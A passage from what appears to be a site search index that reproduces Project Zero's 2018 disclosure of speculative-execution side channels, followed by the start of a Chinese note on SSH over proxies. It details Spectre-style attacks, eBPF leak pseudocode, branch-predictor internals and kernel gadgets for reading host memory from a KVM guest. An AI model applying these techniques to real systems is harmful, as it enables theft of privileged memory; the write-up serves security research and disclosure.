they can be derived from the address guess at which the hit occurred), and the low 16 bits of the address are also known (from the offset inside user_mapping_area at which the hit was found). The remaining part of the address of user_mapping_area is the middle. The remaining bits in the middle can be determined by bisecting the remaining address space: Map two physical pages to adjacent ranges of virtual addresses, each virtual address range the size of half of the remaining search space, then determine the remaining address bit-wise. At this point, a second eBPF program can be used to actually leak data. In pseudocode, this program looks as follows: uint64_t bitmask = ; uint64_t bitshift_selector = ; uint64_t prog_array_base_offset = ; uint64_t secret_data_offset = ; // index will be bounds-checked by the runtime, // but the bounds check will be bypassed speculatively uint64_t secret_data = bpf_map_read(array=victim_array, index=secret_data_offset); // select a single bit, move it to a specific position, and add the base offset uint64_t progmap_index = (((secret_data & bitmask) >> bitshift_selector) << 7) + prog_array_base_offset; bpf_tail_call(prog_map, progmap_index); This program reads 8-byte-aligned 64-bit values from an eBPF data array \"victim_map\" at a runtime-configurable offset and bitmasks and bit-shifts the value so that one bit is mapped to one of two values that are 27 bytes apart (sufficient to not land in the same or adjacent cache lines when used as an array index). Finally it adds a 64-bit offset, then uses the resulting value as an offset into prog_map for a tail call. This program can then be used to leak memory by repeatedly calling the eBPF program with an out-of-bounds offset into victim_map that specifies the data to leak and an out-of-bounds offset into prog_map that causes prog_map + offset to point to a userspace memory area. Misleading the branch prediction and bouncing the cache lines works the same way as for the first eBPF program, except that now, the cache line holding the length of victim_map must also be bounced to another core.","title":"Attacking the kernel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-2-branch-target-injection","text":"This section describes the theory behind our PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific version of Debian's distro kernel running on the host, can read host kernel memory at a rate of around 1500 bytes/second.","title":"Variant 2: Branch target injection"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#basics","text":"Prior research (see the Literature section at the end) has shown that it is possible for code in separate security contexts to influence each other's branch prediction. So far, this has only been used to infer information about where code is located (in other words, to create interference from the victim to the attacker); however, the basic hypothesis of this attack variant is that it can also be used to redirect execution of code in the victim context (in other words, to create interference from the attacker to the victim; the other way around). The basic idea for the attack is to target victim code that contains an indirect branch whose target address is loaded from memory and flush the cache line containing the target address out to main memory. Then, when the CPU reaches the indirect branch, it won't know the true destination of the jump, and it won't be able to calculate the true destination until it has finished loading the cache line back into the CPU, which takes a few hundred cycles. Therefore, there is a time window of typically over 100 cycles in which the CPU will speculatively execute instructions based on branch prediction.","title":"Basics"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#haswell-branch-prediction-internals","text":"Some of the internals of the branch prediction implemented by Intel's processors have already been published; however, getting this attack to work properly required significant further experimentation to determine additional details. This section focuses on the branch prediction internals that were experimentally derived from the Intel Haswell Xeon CPU. Haswell seems to have multiple branch prediction mechanisms that work very differently: A generic branch predictor that can only store one target per source address; used for all kinds of jumps, like absolute jumps, relative jumps and so on. A specialized indirect call predictor that can store multiple targets per source address; used for indirect calls. (There is also a specialized return predictor, according to Intel's optimization manual, but we haven't analyzed that in detail yet. If this predictor could be used to reliably dump out some of the call stack through which a VM was entered, that would be very interesting.)","title":"Haswell branch prediction internals"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_1","text":"Generic predictor The generic branch predictor, as documented in prior research, only uses the lower 31 bits of the address of the last byte of the source instruction for its prediction. If, for example, a branch target buffer (BTB) entry exists for a jump from 0x4141.0004.1000 to 0x4141.0004.5123, the generic predictor will also use it to predict a jump from 0x4242.0004.1000. When the higher bits of the source address differ like this, the higher bits of the predicted destination change together with it\u2014in this case, the predicted destination address will be 0x4242.0004.5123\u2014so apparently this predictor doesn't store the full, absolute destination address. Before the lower 31 bits of the source address are used to look up a BTB entry, they are folded together using XOR. Specifically, the following bits are folded together: | bit A | bit B | | 0x40.0000 | 0x2000 | | 0x80.0000 | 0x4000 | | 0x100.0000 | 0x8000 | | 0x200.0000 | 0x1.0000 | | 0x400.0000 | 0x2.0000 | | 0x800.0000 | 0x4.0000 | | 0x2000.0000 | 0x10.0000 | | 0x4000.0000 | 0x20.0000 | In other words, if a source address is XORed with both numbers in a row of this table, the branch predictor will not be able to distinguish the resulting address from the original source address when performing a lookup. For example, the branch predictor is able to distinguish source addresses 0x100.0000 and 0x180.0000, and it can also distinguish source addresses 0x100.0000 and 0x180.8000, but it can't distinguish source addresses 0x100.0000 and 0x140.2000 or source addresses 0x100.0000 and 0x180.4000. In the following, this will be referred to as aliased source addresses. When an aliased source address is used, the branch predictor will still predict the same target as for the unaliased source address. This indicates that the branch predictor stores a truncated absolute destination address, but that hasn't been verified. Based on observed maximum forward and backward jump distances for different source addresses, the low 32-bit half of the target address could be stored as an absolute 32-bit value with an additional bit that specifies whether the jump from source to target crosses a 232 boundary; if the jump crosses such a boundary, bit 31 of the source address determines whether the high half of the instruction pointer should increment or decrement.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_2","text":"Indirect call predictor The inputs of the BTB lookup for this mechanism seem to be: The low 12 bits of the address of the source instruction (we are not sure whether it's the address of the first or the last byte) or a subset of them. The branch history buffer state. If the indirect call predictor can't resolve a branch, it is resolved by the generic predictor instead. Intel's optimization manual hints at this behavior: \"Indirect Calls and Jumps. These may either be predicted as having a monotonic target or as having targets that vary in accordance with recent program behavior.\" The branch history buffer (BHB) stores information about the last 29 taken branches - basically a fingerprint of recent control flow - and is used to allow better prediction of indirect calls that can have multiple targets. The update function of the BHB works as follows (in pseudocode; src is the address of the last byte of the source instruction, dst is the destination address): void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) { *bhb_state <<= 2; *bhb_state ^= (dst & 0x3f); *bhb_state ^= (src & 0xc0) >> 6; *bhb_state ^= (src & 0xc00) >> (10 - 2); *bhb_state ^= (src & 0xc000) >> (14 - 4); *bhb_state ^= (src & 0x30) << (6 - 4); *bhb_state ^= (src & 0x300) << (8 - 8); *bhb_state ^= (src & 0x3000) >> (12 - 10); *bhb_state ^= (src & 0x30000) >> (16 - 12); *bhb_state ^= (src & 0xc0000) >> (18 - 14); } Some of the bits of the BHB state seem to be folded together further using XOR when used for a BTB access, but the precise folding function hasn't been understood yet. The BHB is interesting for two reasons. First, knowledge about its approximate behavior is required in order to be able to accurately cause collisions in the indirect call predictor. But it also permits dumping out the BHB state at any repeatable program state at which the attacker can execute code - for example, when attacking a hypervisor, directly after a hypercall. The dumped BHB state can then be used to fingerprint the hypervisor or, if the attacker has access to the hypervisor binary, to determine the low 20 bits of the hypervisor load address (in the case of KVM: the low 20 bits of the load address of kvm-intel.ko).","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_3","text":"Reverse-Engineering Branch Predictor Internals This subsection describes how we reverse-engineered the internals of the Haswell branch predictor. Some of this is written down from memory, since we didn't keep a detailed record of what we were doing. We initially attempted to perform BTB injections into the kernel using the generic predictor, using the knowledge from prior research that the generic predictor only looks at the lower half of the source address and that only a partial target address is stored. This kind of worked - however, the injection success rate was very low, below 1%. (This is the method we used in our preliminary PoCs for method 2 against modified hypervisors running on Haswell.) We decided to write a userspace test case to be able to more easily test branch predictor behavior in different situations. Based on the assumption that branch predictor state is shared between hyperthreads [10], we wrote a program of which two instances are each pinned to one of the two logical processors running on a specific physical core, where one instance attempts to perform branch injections while the other measures how often branch injections are successful. Both instances were executed with ASLR disabled and had the same code at the same addresses. The injecting process performed indirect calls to a function that accesses a (per-process) test variable; the measuring process performed indirect calls to a function that tests, based on timing, whether the per-process test variable is cached, and then evicts it using CLFLUSH. Both indirect calls were performed through the same callsite. Before each indirect call, the function pointer stored in memory was flushed out to main memory using CLFLUSH to widen the speculation time window. Additionally, because of the reference to \"recent program behavior\" in Intel's optimization manual, a bunch of conditional branches that are always taken were inserted in front of the indirect call. In this test, the injection success rate was above 99%, giving us a base setup for future experiments. We then tried to figure out the details of the prediction scheme. We assumed that the prediction scheme uses a global branch history buffer of some kind. To determine the duration for which branch information stays in the history buffer, a conditional branch that is only taken in one of the two program instances was inserted in front of the series of always-taken conditional jumps, then the number of always-taken conditional jumps (N) was varied. The result was that for N=25, the processor was able to distinguish the branches (misprediction rate under 1%), but for N=26, it failed to do so (misprediction rate over 99%). Therefore, the branch history buffer had to be able to store information about at least the last 26 branches. The code in one of the two program instances was then moved around in memory. This revealed that only the lower 20 bits of the source and target addresses have an influence on the branch history buffer. Testing with different types of branches in the two program instances revealed that static jumps, taken conditional jumps, calls and returns influence the branch history buffer the same way; non-taken conditional jumps don't influence it; the address of the last byte of the source instruction is the one that counts; IRETQ doesn't influence the history buffer state (which is useful for testing because it permits creating program flow that is invisible to the history buffer). Moving the last conditional branch before the indirect call around in memory multiple times revealed that the branch history buffer contents can be used to distinguish many different locations of that last conditional branch instruction. This suggests that the history buffer doesn't store a list of small history values; instead, it seems to be a larger buffer in which history data is mixed together. However, a history buffer needs to \"forget\" about past branches after a certain number of new branches have been taken in order to be useful for branch prediction. Therefore, when new data is mixed into the history buffer, this can not cause information in bits that are already present in the history buffer to propagate downwards - and given that, upwards combination of information probably wouldn't be very useful either. Given that branch prediction also must be very fast, we concluded that it is likely that the update function of the history buffer left-shifts the old history buffer, then XORs in the new state (see diagram). If this assumption is correct, then the history buffer contains a lot of information about the most recent branches, but only contains as many bits of information as are shifted per history buffer update about the last branch about which it contains any data. Therefore, we tested whether flipping different bits in the source and target addresses of a jump followed by 32 always-taken jumps with static source and target allows the branch prediction to disambiguate an indirect call. [11] With 32 static jumps in between, no bit flips seemed to have an influence, so we decreased the number of static jumps until a difference was observable. The result with 28 always-taken jumps in between was that bits 0x1 and 0x2 of the target and bits 0x40 and 0x80 of the source had such an influence; but flipping both 0x1 in the target and 0x40 in the source or 0x2 in the target and 0x80 in the source did not permit disambiguation. This shows that the per-insertion shift of the history buffer is 2 bits and shows which data is stored in the least significant bits of the history buffer. We then repeated this with decreased amounts of fixed jumps after the bit-flipped jump to determine which information is stored in the remaining bits.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#reading-host-memory-from-a-kvm-guest","text":"","title":"Reading host memory from a KVM guest"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_4","text":"Locating the host kernel Our PoC locates the host kernel in several steps. The information that is determined and necessary for the next steps of the attack consists of: lower 20 bits of the address of kvm-intel.ko full address of kvm.ko full address of vmlinux Looking back, this is unnecessarily complicated, but it nicely demonstrates the various techniques an attacker can use. A simpler way would be to first determine the address of vmlinux, then bisect the addresses of kvm.ko and kvm-intel.ko. In the first step, the address of kvm-intel.ko is leaked. For this purpose, the branch history buffer state after guest entry is dumped out. Then, for every possible value of bits 12..19 of the load address of kvm-intel.ko, the expected lowest 16 bits of the history buffer are computed based on the load address guess and the known offsets of the last 8 branches before guest entry, and the results are compared against the lowest 16 bits of the leaked history buffer state. The branch history buffer state is leaked in steps of 2 bits by measuring misprediction rates of an indirect call with two targets. One way the indirect call is reached is from a vmcall instruction followed by a series of N branches whose relevant source and target address bits are all zeroes. The second way the indirect call is reached is from a series of controlled branches in userspace that can be used to write arbitrary values into the branch history buffer. Misprediction rates are measured as in the section \"Reverse-Engineering Branch Predictor Internals\", using one call target that loads a cache line and another one that checks whether the same cache line has been loaded. With N=29, mispredictions will occur at a high rate if the controlled branch history buffer value is zero because all history buffer state from the hypercall has been erased. With N=28, mispredictions will occur if the controlled branch history buffer value is one of 0<<(28 2), 1<<(28 2), 2<<(28 2), 3<<(28 2) - by testing all four possibilities, it can be detected which one is right. Then, for decreasing values of N, the four possibilities are {0|1|2|3}<<(28*2) | (history_buffer_for(N+1) >> 2). By repeating this for decreasing values for N, the branch history buffer value for N=0 can be determined. At this point, the low 20 bits of kvm-intel.ko are known; the next step is to roughly locate kvm.ko. For this, the generic branch predictor is used, using data inserted into the BTB by an indirect call from kvm.ko to kvm-intel.ko that happens on every hypercall; this means that the source address of the indirect call has to be leaked out of the BTB. kvm.ko will probably be located somewhere in the range from 0xffffffffc0000000 to 0xffffffffc4000000, with page alignment (0x1000). This means that the first four entries in the table in the section \"Generic Predictor\" apply; there will be 24-1=15 aliasing addresses for the correct one. But that is also an advantage: It cuts down the search space from 0x4000 to 0x4000/24=1024. To find the right address for the source or one of its aliasing addresses, code that loads data through a specific register is placed at all possible call targets (the leaked low 20 bits of kvm-intel.ko plus the in-module offset of the call target plus a multiple of 220) and indirect calls are placed at all possible call sources. Then, alternatingly, hypercalls are performed and indirect calls are performed through the different possible non-aliasing call sources, with randomized history buffer state that prevents the specialized prediction from working. After this step, there are 216 remaining possibilities for the load address of kvm.ko. Next, the load address of vmlinux can be determined in a similar way, using an indirect call from vmlinux to kvm.ko. Luckily, none of the bits which are randomized in the load address of vmlinux are folded together, so unlike when locating kvm.ko, the result will directly be unique. vmlinux has an alignment of 2MiB and a randomization range of 1GiB, so there are still only 512 possible addresses. Because (as far as we know) a simple hypercall won't actually cause indirect calls from vmlinux to kvm.ko, we instead use port I/O from the status register of an emulated serial port, which is present in the default configuration of a virtual machine created with virt-manager. The only remaining piece of information is which one of the 16 aliasing load addresses of kvm.ko is actually correct. Because the source address of an indirect call to kvm.ko is known, this can be solved using bisection: Place code at the various possible targets that, depending on which instance of the code is speculatively executed, loads one of two cache lines, and measure which one of the cache lines gets loaded.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_5","text":"Identifying cache sets The PoC assumes that the VM does not have access to hugepages.To discover eviction sets for all L3 cache sets with a specific alignment relative to a 4KiB page boundary, the PoC first allocates 25600 pages of memory. Then, in a loop, it selects random subsets of all remaining unsorted pages such that the expected number of sets for which an eviction set is contained in the subset is 1, reduces each subset down to an eviction set by repeatedly accessing its cache lines and testing whether the cache lines are always cached (in which case they're probably not part of an eviction set) and attempts to use the new eviction set to evict all remaining unsorted cache lines to determine whether they are in the same cache set [12].","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_6","text":"Locating the host-virtual address of a guest page Because this attack uses a FLUSH+RELOAD approach for leaking data, it needs to know the host-kernel-virtual address of one guest page. Alternative approaches such as PRIME+PROBE should work without that requirement. The basic idea for this step of the attack is to use a branch target injection attack against the hypervisor to load an attacker-controlled address and test whether that caused the guest-owned page to be loaded. For this, a gadget that simply loads from the memory location specified by R8 can be used - R8-R11 still contain guest-controlled values when the first indirect call after a guest exit is reached on this kernel build. We expected that an attacker would need to either know which eviction set has to be used at this point or brute-force it simultaneously; however, experimentally, using random eviction sets works, too. Our theory is that the observed behavior is actually the result of L1D and L2 evictions, which might be sufficient to permit a few instructions worth of speculative execution. The host kernel maps (nearly?) all physical memory in the physmap area, including memory assigned to KVM guests. However, the location of the physmap is randomized (with a 1GiB alignment), in an area of size 128PiB. Therefore, directly bruteforcing the host-virtual address of a guest page would take a long time. It is not necessarily impossible; as a ballpark estimate, it should be possible within a day or so, maybe less, assuming 12000 successful injections per second and 30 guest pages that are tested in parallel; but not as impressive as doing it in a few minutes. To optimize this, the problem can be split up: First, brute-force the physical address using a gadget that can load from physical addresses, then brute-force the base address of the physmap region. Because the physical address can usually be assumed to be far below 128PiB, it can be brute-forced more efficiently, and brute-forcing the base address of the physmap region afterwards is also easier because then address guesses with 1GiB alignment can be used. To brute-force the physical address, the following gadget can be used: ffffffff810a9def: 4c 89 c0 mov rax,r8 ffffffff810a9df2: 4d 63 f9 movsxd r15,r9d ffffffff810a9df5: 4e 8b 04 fd c0 b3 a6 mov r8,QWORD PTR [r15*8-0x7e594c40] ffffffff810a9dfc: 81 ffffffff810a9dfd: 4a 8d 3c 00 lea rdi,[rax+r8*1] ffffffff810a9e01: 4d 8b a4 00 f8 00 00 mov r12,QWORD PTR [r8+rax*1+0xf8] ffffffff810a9e08: 00 This gadget permits loading an 8-byte-aligned value from the area around the kernel text section by setting R9 appropriately, which in particular permits loading page_offset_base, the start address of the physmap. Then, the value that was originally in R8 - the physical address guess minus 0xf8 - is added to the result of the previous load, 0xfa is added to it, and the result is dereferenced.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_7","text":"Cache set selection To select the correct L3 eviction set, the attack from the following section is essentially executed with different eviction sets until it works.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#_8","text":"Leaking data At this point, it would normally be necessary to locate gadgets in the host kernel code that can be used to actually leak data by reading from an attacker-controlled location, shifting and masking the result appropriately and then using the result of that as offset to an attacker-controlled address for a load. But piecing gadgets together and figuring out which ones work in a speculation context seems annoying. So instead, we decided to use the eBPF interpreter, which is built into the host kernel - while there is no legitimate way to invoke it from inside a VM, the presence of the code in the host kernel's text section is sufficient to make it usable for the attack, just like with ordinary ROP gadgets. The eBPF interpreter entry point has the following function signature: static unsigned int __bpf_prog_run(void ctx, const struct bpf_insn insn) The second parameter is a pointer to an array of statically pre-verified eBPF instructions to be executed - which means that __bpf_prog_run() will not perform any type checks or bounds checks. The first parameter is simply stored as part of the initial emulated register state, so its value doesn't matter. The eBPF interpreter provides, among other things: multiple emulated 64-bit registers 64-bit immediate writes to emulated registers memory reads from addresses stored in emulated registers bitwise operations (including bit shifts) and arithmetic operations To call the interpreter entry point, a gadget that gives RSI and RIP control given R8-R11 control and controlled data at a known memory location is necessary. The following gadget provides this functionality: ffffffff81514edd: 4c 89 ce mov rsi,r9 ffffffff81514ee0: 41 ff 90 b0 00 00 00 call QWORD PTR [r8+0xb0] Now, by pointing R8 and R9 at the mapping of a guest-owned page in the physmap, it is possible to speculatively execute arbitrary unvalidated eBPF bytecode in the host kernel. Then, relatively straightforward bytecode can be used to leak data into the cache.","title":""},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-3-rogue-data-cache-load","text":"Basically, read Anders Fogh's blogpost: https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ In summary, an attack using this variant of the issue attempts to read kernel memory from userspace without misdirecting the control flow of kernel code. This works by using the code pattern that was used for the previous variants, but in userspace. The underlying idea is that the permission check for accessing an address might not be on the critical path for reading data from memory to a register, where the permission check could have significant performance impact. Instead, the memory read could make the result of the read available to following instructions immediately and only perform the permission check asynchronously, setting a flag in the reorder buffer that causes an exception to be raised if the permission check fails. We do have a few additions to make to Anders Fogh's blogpost: \"Imagine the following instruction executed in usermode mov rax,[somekernelmodeaddress] It will cause an interrupt when retired, [...]\" It is also possible to already execute that instruction behind a high-latency mispredicted branch to avoid taking a page fault. This might also widen the speculation window by increasing the delay between the read from a kernel address and delivery of the associated exception. \"First, I call a syscall that touches this memory. Second, I use the prefetcht0 instruction to improve my odds of having the address loaded in L1.\" When we used prefetch instructions after doing a syscall, the attack stopped working for us, and we have no clue why. Perhaps the CPU somehow stores whether access was denied on the last access and prevents the attack from working if that is the case? \"Fortunately I did not get a slow read suggesting that Intel null\u2019s the result when the access is not allowed.\" That (read from kernel address returns all-zeroes) seems to happen for memory that is not sufficiently cached but for which pagetable entries are present, at least after repeated read attempts. For unmapped memory, the kernel address read does not return a result at all.","title":"Variant 3: Rogue data cache load"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#ideas-for-further-research","text":"We believe that our research provides many remaining research topics that we have not yet investigated, and we encourage other public researchers to look into these. This section contains an even higher amount of speculation than the rest of this blogpost - it contains untested ideas that might well be useless.","title":"Ideas for further research"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-without-data-cache-timing","text":"It would be interesting to explore whether there are microarchitectural attacks other than measuring data cache timing that can be used for exfiltrating data out of speculative execution.","title":"Leaking without data cache timing"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#other-microarchitectures","text":"Our research was relatively Haswell-centric so far. It would be interesting to see details e.g. on how the branch prediction of other modern processors works and how well it can be attacked.","title":"Other microarchitectures"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#other-jit-engines","text":"We developed a successful variant 1 attack against the JIT engine built into the Linux kernel. It would be interesting to see whether attacks against more advanced JIT engines with less control over the system are also practical - in particular, JavaScript engines.","title":"Other JIT engines"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#more-efficient-scanning-for-host-virtual-addresses-and-cache-sets","text":"In variant 2, while scanning for the host-virtual address of a guest-owned page, it might make sense to attempt to determine its L3 cache set first. This could be done by performing L3 evictions using an eviction pattern through the physmap, then testing whether the eviction affected the guest-owned page. The same might work for cache sets - use an L1D+L2 eviction set to evict the function pointer in the host kernel context, use a gadget in the kernel to evict an L3 set using physical addresses, then use that to identify which cache sets guest lines belong to until a guest-owned eviction set has been constructed.","title":"More efficient scanning for host-virtual addresses and cache sets"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#dumping-the-complete-btb-state","text":"Given that the generic BTB seems to only be able to distinguish 231-8 or fewer source addresses, it seems feasible to dump out the complete BTB state generated by e.g. a hypercall in a timeframe around the order of a few hours. (Scan for jump sources, then for every discovered jump source, bisect the jump target.) This could potentially be used to identify the locations of functions in the host kernel even if the host kernel is custom-built. The source address aliasing would reduce the usefulness somewhat, but because target addresses don't suffer from that, it might be possible to correlate (source,target) pairs from machines with different KASLR offsets and reduce the number of candidate addresses based on KASLR being additive while aliasing is bitwise. This could then potentially allow an attacker to make guesses about the host kernel version or the compiler used to build it based on jump offsets or distances between functions.","title":"Dumping the complete BTB state"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-2-leaking-with-more-efficient-gadgets","text":"If sufficiently efficient gadgets are used for variant 2, it might not be necessary to evict host kernel function pointers from the L3 cache at all; it might be sufficient to only evict them from L1D and L2.","title":"Variant 2: Leaking with more efficient gadgets"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#various-speedups","text":"In particular the variant 2 PoC is still a bit slow. This is probably partly because: It only leaks one bit at a time; leaking more bits at a time should be doable. It heavily uses IRETQ for hiding control flow from the processor. It would be interesting to see what data leak rate can be achieved using variant 2.","title":"Various speedups"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-or-injection-through-the-return-predictor","text":"If the return predictor also doesn't lose its state on a privilege level change, it might be useful for either locating the host kernel from inside a VM (in which case bisection could be used to very quickly discover the full address of the host kernel) or injecting return targets (in particular if the return address is stored in a cache line that can be flushed out by the attacker and isn't reloaded before the return instruction). However, we have not performed any experiments with the return predictor that yielded conclusive results so far.","title":"Leaking or injection through the return predictor"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#leaking-data-out-of-the-indirect-call-predictor","text":"We have attempted to leak target information out of the indirect call predictor, but haven't been able to make it work.","title":"Leaking data out of the indirect call predictor"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#vendor-statements","text":"The following statement were provided to us regarding this issue from the vendors to whom Project Zero disclosed this vulnerability:","title":"Vendor statements"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#intel","text":"Intel is committed to improving the overall security of computer systems. The methods described here rely on common properties of modern microprocessors. Thus, susceptibility to these methods is not limited to Intel processors, nor does it mean that a processor is working outside its intended functional specification. Intel is working closely with our ecosystem partners, as well as with other silicon vendors whose processors are affected, to design and distribute both software and hardware mitigations for these methods. For more information and links to useful resources, visit: https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&languageid=en-fr http://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf","title":"Intel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#amd","text":"AMD provided the following link: http://www.amd.com/en/corporate/speculative-execution","title":"AMD"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#arm","text":"Arm recognises that the speculation functionality of many modern high-performance processors, despite working as intended, can be used in conjunction with the timing of cache operations to leak some information as described in this blog. Correspondingly, Arm has developed software mitigations that we recommend be deployed. Specific details regarding the affected processors and mitigations can be found at this website: https://developer.arm.com/support/security-update Arm has included a detailed technical whitepaper as well as links to information from some of Arm\u2019s architecture partners regarding their specific implementations and mitigations.","title":"ARM"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#literature","text":"Note that some of these documents - in particular Intel's documentation - change over time, so quotes from and references to it may not reflect the latest version of Intel's documentation. https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf : Intel's optimization manual has many interesting pieces of optimization advice that hint at relevant microarchitectural behavior; for example: \"Placing data immediately following an indirect branch can cause a performance problem. If the data consists of all zeros, it looks like a long stream of ADDs to memory destinations and this can cause resource conflicts and slow down branch recovery. Also, data immediately following indirect branches may appear as branches to the branch predication [sic] hardware, which can branch off to execute other data pages. This can lead to subsequent self-modifying code problems.\" \"Loads can:[...]Be carried out speculatively, before preceding branches are resolved.\" \"Software should avoid writing to a code page in the same 1-KByte subpage that is being executed or fetching code in the same 2-KByte subpage of that is being written. In addition, sharing a page containing directly or speculatively executed code with another processor as a data page can trigger an SMC condition that causes the entire pipeline of the machine and the trace cache to be cleared. This is due to the self-modifying code condition.\" \"if mapped as WB or WT, there is a potential for speculative processor reads to bring the data into the caches\" \"Failure to map the region as WC may allow the line to be speculatively read into the processor caches (via the wrong path of a mispredicted branch).\" https://software.intel.com/en-us/articles/intel-sdm : Intel's Software Developer Manuals http://www.agner.org/optimize/microarchitecture.pdf : Agner Fog's documentation of reverse-engineered processor behavior and relevant theory was very helpful for this research. http://www.cs.binghamton.edu/~dima/micro16.pdf and https://github.com/felixwilhelm/mario_baslr : Prior research by Dmitry Evtyushkin, Dmitry Ponomarev and Nael Abu-Ghazaleh on abusing branch target buffer behavior to leak addresses that we used as a starting point for analyzing the branch prediction of Haswell processors. Felix Wilhelm's research based on this provided the basic idea behind variant 2. https://arxiv.org/pdf/1507.06955.pdf : The rowhammer.js research by Daniel Gruss, Cl\u00e9mentine Maurice and Stefan Mangard contains information about L3 cache eviction patterns that we reused in the KVM PoC to evict a function pointer. https://xania.org/201602/bpu-part-one : Matt Godbolt blogged about reverse-engineering the structure of the branch predictor on Intel processors. https://www.sophia.re/thesis.pdf : Sophia D'Antoine wrote a thesis that shows that opcode scheduling can theoretically be used to transmit data between hyperthreads. https://gruss.cc/files/kaiser.pdf : Daniel Gruss, Moritz Lipp, Michael Schwarz, Richard Fellner, Cl\u00e9mentine Maurice, and Stefan Mangard wrote a paper on mitigating microarchitectural issues caused by pagetable sharing between userspace and the kernel. https://www.jilp.org/ : This journal contains many articles on branch prediction. http://blog.stuffedcow.net/2013/01/ivb-cache-replacement/ : This blogpost by Henry Wong investigates the L3 cache replacement policy used by Intel's Ivy Bridge architecture.","title":"Literature"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#references","text":"[1] This initial report did not contain any information about variant 3. We had discussed whether direct reads from kernel memory could work, but thought that it was unlikely. We later tested and reported variant 3 prior to the publication of Anders Fogh's work at https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ . [2] The precise model names are listed in the section \"Tested Processors\". The code for reproducing this is in the writeup_files.tar archive in our bugtracker, in the folders userland_test_x86 and userland_test_aarch64. [3] The attacker-controlled offset used to perform an out-of-bounds access on an array by this PoC is a 32-bit value, limiting the accessible addresses to a 4GiB window in the kernel heap area. [4] This PoC won't work on CPUs with SMAP support; however, that is not a fundamental limitation. [5] linux-image-4.9.0-3-amd64 at version 4.9.30-2+deb9u2 (available at http://snapshot.debian.org/archive/debian/20170701T224614Z/pool/main/l/linux/linux-image-4.9.0-3-amd64_4.9.30-2%2Bdeb9u2_amd64.deb , sha256 5f950b26aa7746d75ecb8508cc7dab19b3381c9451ee044cd2edfd6f5efff1f8, signed via Release.gpg , Release , Packages.xz ); that was the current distro kernel version when I set up the machine. It is very unlikely that the PoC works with other kernel versions without changes; it contains a number of hardcoded addresses/offsets. [6] The phone was running an Android build from May 2017. [7] https://software.intel.com/en-us/articles/intel-sdm [8] https://software.intel.com/en-us/articles/avoiding-and-identifying-false-sharing-among-threads , section \"background\" [9] More than 215 mappings would be more efficient, but the kernel places a hard cap of 216 on the number of VMAs that a process can have. [10] Intel's optimization manual states that \"In the first implementation of HT Technology, the physical execution resources are shared and the architecture state is duplicated for each logical processor\", so it would be plausible for predictor state to be shared. While predictor state could be tagged by logical core, that would likely reduce performance for multithreaded processes, so it doesn't seem likely. [11] In case the history buffer was a bit bigger than we had measured, we added some margin - in particular because we had seen slightly different history buffer lengths in different experiments, and because 26 isn't a very round number. [12] The basic idea comes from http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf , section IV, although the authors of that paper still used hugepages. \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html","title":"References"},{"location":"RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/","text":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5 \u4ece\u76ee\u524d\u7f51\u4e0a\u7684\u8d44\u6599\u6765\u770b\uff0c\u901a\u8fc7\u4ee3\u7406\u6765\u8fde\u63a5 ssh \u67092\u79cd\u65b9\u5f0f\uff1a \u4e00\u79cd\u662f\u7528Corkscrew\u5b9e\u73b0http\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c corkscrew\u5b98\u65b9\u4e3b\u9875 \uff1b \u53e6\u5916\u4e00\u79cd\u662f\u5229\u7528connect\u80fd\u5b9e\u73b0Sock5\u548chttp\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c connect\u5b98\u65b9\u4e3b\u9875 \uff08connect\u9879\u76ee\u73b0\u5df2\u64a4\u51fa\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\uff1a \u70b9\u8fd9\u91cc \uff09\u3002 